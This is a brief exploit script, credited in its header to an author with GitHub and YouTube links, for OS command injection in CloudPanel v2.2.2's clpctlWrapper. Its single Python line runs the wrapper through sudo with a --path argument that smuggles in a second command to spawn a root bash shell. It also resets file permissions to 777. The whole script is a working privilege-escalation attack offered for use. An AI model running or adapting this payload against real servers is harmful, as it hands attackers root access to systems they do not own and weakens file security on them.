# Exploit Author : EagleEye
# Github : https://github.com/EagleTube/
# Youtube : https://www.youtube.com/@EagleTube1337
# Title : Os Command Injection on clpctlWrapper leads to Privilege Escalation
# Impact : Privilege Escalation
# Version Tested : CloudPanel v2.2.2

import os

os.system('sudo /usr/bin/clpctlWrapper system:permissions:reset --files=777 --path=".profile;sudo su -c \'/bin/bash\'"')
